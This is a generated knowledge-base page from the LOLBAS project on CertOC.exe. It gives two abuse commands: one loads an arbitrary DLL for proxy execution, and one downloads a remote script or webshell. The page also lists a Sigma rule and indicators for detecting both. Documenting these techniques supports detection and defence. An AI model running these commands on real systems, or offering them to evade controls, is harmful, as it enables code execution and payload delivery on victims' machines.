---
title: "CertOC.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/Certoc.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certoc.yml"
build_date: "2026-04-27 19:14:21"
category: "OSBinaries"
aliases:
  - "CertOC.exe"
functions:
  - "Execute"
  - "Download"
attack_technique_ids:
  - "T1218"
  - "T1105"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Used for installing certificates

## Paths

- `c:\windows\system32\certoc.exe`
- `c:\windows\syswow64\certoc.exe`

## Commands

### 1. Execute

Loads the target DLL file

```cmd
certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll}
```

- Use Case: Execute code within DLL file
- Privileges: User
- Operating System: Windows Server 2022
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218: System Binary Proxy Execution]]

### 2. Download

Downloads text formatted files

```cmd
certoc.exe -GetCACAPS {REMOTEURL:.ps1}
```

- Use Case: Download scripts, webshells etc.
- Privileges: User
- Operating System: Windows Server 2022
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certoc_load_dll.yml
- IOC: Process creation with given parameter
- IOC: Unsigned DLL load via certoc.exe
- IOC: Network connection via certoc.exe

## Resources

- {'Link': 'https://twitter.com/sblmsrsn/status/1445758411803480072?s=20'}
- {'Link': 'https://twitter.com/sblmsrsn/status/1452941226198671363?s=20'}

## Acknowledgements

- {'Person': 'Ensar Samil', 'Handle': '@sblmsrsn'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certoc.yml)
